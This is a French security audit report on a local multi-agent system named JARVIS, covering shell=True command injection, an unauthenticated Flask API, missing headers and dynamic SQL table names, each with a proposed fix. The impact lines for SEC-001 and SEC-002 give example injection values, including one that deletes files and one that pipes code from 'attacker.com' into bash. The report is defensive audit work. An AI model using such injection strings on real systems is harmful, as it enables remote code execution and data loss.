# Security Best Practices Report — JARVIS
> Date : 2026-04-14 | Scope : `/home/turbo/IA/Core/jarvis/core/` + `scripts/`
> Frameworks : Python/Flask (:8767, :8768), HTTPServer custom (:18800), SQLite

---

## Executive Summary

JARVIS est un système d'orchestration multi-agents **tournant en réseau local fermé** (non exposé sur internet). Les risques les plus élevés sont concentrés sur des patterns `shell=True` avec données variables, et l'absence d'authentification sur l'API Flask interne. Aucun secret n'est commité en clair. Le debug mode Flask est correctement désactivé.

**3 findings HIGH · 2 MEDIUM · 1 LOW**

---

## 🔴 HIGH

### SEC-001 — Command Injection via shell=True + task.prompt
- **Rule ID** : FLASK-INJECT-002
- **Severity** : High
- **Location** : `core/router/dispatcher.py:114`
- **Evidence** :
  ```python
  proc = subprocess.run(task.prompt, shell=True, capture_output=True, text=True, timeout=task.timeout)
  ```
- **Impact** : Si `task.prompt` contient des données issues d'une source externe (API, queue, webhook), un attaquant peut injecter des commandes shell arbitraires sur le serveur. Exemple : `task.prompt = "ls; rm -rf /tmp/jarvis"`.
- **Fix** :
  ```python
  # Remplacer shell=True par une liste de tokens validés
  import shlex
  cmd_parts = shlex.split(task.prompt)
  # Valider le premier token (whitelist de commandes autorisées)
  ALLOWED_CMDS = {"python3", "bash", "jarvis", "lm-ask.sh"}
  if cmd_parts[0] not in ALLOWED_CMDS:
      raise ValueError(f"Command not allowed: {cmd_parts[0]!r}")
  proc = subprocess.run(cmd_parts, capture_output=True, text=True, timeout=task.timeout)
  ```
- **Mitigation** : Toujours passer les arguments en liste, jamais en string avec `shell=True`.

---

### SEC-002 — Command Injection via cmd.format(**context) + shell=True
- **Rule ID** : FLASK-INJECT-002
- **Severity** : High
- **Location** : `core/jarvis_incident_chain.py:57-60`
- **Evidence** :
  ```python
  cmd_fmt = cmd.format(**context)  # context["node_ip"] vient d'un événement externe
  out = subprocess.run(cmd_fmt, shell=True, capture_output=True, text=True, timeout=30)
  ```
  Appelé ligne 86 avec :
  ```python
  run_chain("node_down", context={"node_ip": evt.get("data", {}).get("ip", "")})
  ```
- **Impact** : Un événement malveillant avec `"ip": "1.2.3.4; curl attacker.com | bash"` exécute du code arbitraire.
- **Fix** :
  ```python
  # Valider node_ip avant d'injecter dans la commande
  import re
  node_ip = context.get("node_ip", "")
  if not re.fullmatch(r"[\d.]+", node_ip):
      raise ValueError(f"Invalid node_ip: {node_ip!r}")
  # Passer en liste, pas en string
  cmd_parts = cmd.split()  # commande doit être définie sans interpolation
  # Ajouter node_ip séparément comme argument
  subprocess.run(cmd_parts + [node_ip], capture_output=True, text=True, timeout=30)
  ```

---

### SEC-003 — shell=True avec commande issue de la DB SQLite
- **Rule ID** : FLASK-INJECT-002
- **Severity** : High
- **Location** : `core/jarvis_scheduler.py:57`
- **Evidence** :
  ```python
  row = con.execute("SELECT name,prompt,agent FROM tasks WHERE id=?", (task_id,)).fetchone()
  name, cmd, agent = row
  result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
  ```
- **Impact** : Quiconque peut écrire dans la table `tasks` (via API `/queue/enqueue` ou accès direct SQLite) peut exécuter des commandes shell arbitraires.
- **Fix** :
  ```python
  import shlex
  # Désactiver shell=True — passer la commande en liste
  cmd_parts = shlex.split(cmd)
  result = subprocess.run(cmd_parts, capture_output=True, text=True, timeout=120)
  ```
  Ou mieux : stocker un type de tâche connu + paramètres séparés, jamais une commande shell libre.

---

## 🟡 MEDIUM

### SEC-004 — Absence d'authentification sur l'API Flask interne (:8767)
- **Rule ID** : Custom (pas dans Flask spec — bonne pratique générale)
- **Severity** : Medium
- **Location** : `core/jarvis_api_gateway.py` — toutes les routes
- **Evidence** : Aucun middleware d'auth sur les routes `/config/<key>` (POST), `/llm/ask` (POST), `/flags/<flag>` (POST), `/notify` (POST).
- **Impact** : Tout processus ou service sur le réseau local peut modifier la config JARVIS, déclencher des inférences LLM, ou envoyer des notifications sans aucune validation d'identité.
- **Fix** : Ajouter un token statique minimal via header :
  ```python
  INTERNAL_TOKEN = os.environ.get("JARVIS_API_TOKEN", "")

  def require_token():
      if INTERNAL_TOKEN and request.headers.get("X-Jarvis-Token") != INTERNAL_TOKEN:
          from flask import abort
          abort(401)

  @app.before_request
  def auth_check():
      if request.endpoint not in ("health",):  # exclure /health
          require_token()
  ```
  Définir `JARVIS_API_TOKEN` dans `/home/turbo/.claude/settings.json` → env.

---

### SEC-005 — Absence de security headers HTTP sur l'API Flask
- **Rule ID** : FLASK-HEADERS-001
- **Severity** : Medium
- **Location** : `core/jarvis_api_gateway.py` — aucun `after_request` hook
- **Evidence** : Aucune référence à `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy` dans le fichier.
- **Impact** : Réponses JSON rendues dans un navigateur vulnérables au MIME sniffing et au clickjacking (faible risque ici car API interne, mais bonne hygiène).
- **Fix** :
  ```python
  @app.after_request
  def security_headers(resp):
      resp.headers["X-Content-Type-Options"] = "nosniff"
      resp.headers["X-Frame-Options"] = "DENY"
      resp.headers["Cache-Control"] = "no-store"
      return resp
  ```

---

## 🟢 LOW

### SEC-006 — Construction SQL avec nom de table variable (memory/facade.py)
- **Rule ID** : FLASK-INJECT-001 (partiel)
- **Severity** : Low
- **Location** : `core/memory/facade.py:64,83,108`
- **Evidence** :
  ```python
  sql = f"INSERT INTO {table} ({cols}) VALUES ({placeholders})"
  cnt = self.query(name, f"SELECT COUNT(*) AS c FROM [{t}]")
  dump[table] = self.query(db_name, f"SELECT * FROM [{table}]")
  ```
- **Impact** : `table` vient du code interne (pas d'input utilisateur direct). Risque faible tant que les noms de tables ne sont pas influençables par l'extérieur. Les crochets `[table]` (SQLite quoting) atténuent partiellement.
- **Fix** : Valider les noms de tables contre une whitelist ou utiliser un pattern regex `^[a-zA-Z_][a-zA-Z0-9_]*$` avant injection dans la requête SQL.

---

## ✅ Conforme — Points positifs

| Point | Statut |
|-------|--------|
| Flask debug=False en production | ✅ |
| Pas de `app.run(debug=True)` | ✅ |
| Pas de SECRET_KEY hardcodé | ✅ |
| SQL paramétré dans jarvis_scheduler.py (SELECT) | ✅ (`WHERE id=?`) |
| lm_guard.py dans pre-inference | ✅ (ajouté aujourd'hui) |
| quality_hub pré-filtre injection/modération | ✅ (ajouté aujourd'hui) |
| agent_planner whitelist commandes | ✅ (ligne 405-410) |

---

## Priorité d'action

| ID | Fichier | Effort | Impact |
|----|---------|--------|--------|
| SEC-001 | `router/dispatcher.py:114` | 5 min | Éliminer RCE |
| SEC-002 | `jarvis_incident_chain.py:57` | 10 min | Éliminer RCE via événements |
| SEC-003 | `jarvis_scheduler.py:57` | 5 min | Éliminer RCE via DB |
| SEC-004 | `jarvis_api_gateway.py` | 15 min | Auth interne minimale |
| SEC-005 | `jarvis_api_gateway.py` | 5 min | Headers HTTP |
| SEC-006 | `memory/facade.py` | 10 min | Validation noms tables |
